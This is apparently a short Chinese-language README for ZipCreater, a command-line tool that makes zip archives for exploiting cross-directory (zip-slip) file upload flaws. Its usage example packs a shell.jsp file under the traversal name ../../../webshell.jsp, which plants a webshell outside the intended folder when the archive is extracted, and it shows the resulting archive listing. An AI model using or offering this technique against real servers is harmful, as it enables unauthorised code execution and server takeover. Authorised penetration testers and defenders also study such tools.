## ZipCreater

ZipCreater主要应用于跨目录的文件上传漏洞的利用，它能够快速进行压缩包生成，[evilarc.py](https://github.com/ptoomey3/evilarc/blob/master/evilarc.py)不支持修改已有的压缩包，但ZipCreater可以。

使用方式：

假设`/tmp/payload`文件夹内的文件列表如下：

```
1.txt
2.txt
shell.jsp
```

使用ZipCreater可以生成跨目录的文件名：

```
$ zipcreater -source /tmp/payload/ -dest /tmp/exploit.zip -filename shell.jsp -path ../../../webshell.jsp
```

exploit.zip内容如下：

```
1.txt
2.txt
../../../webshell.jsp
```

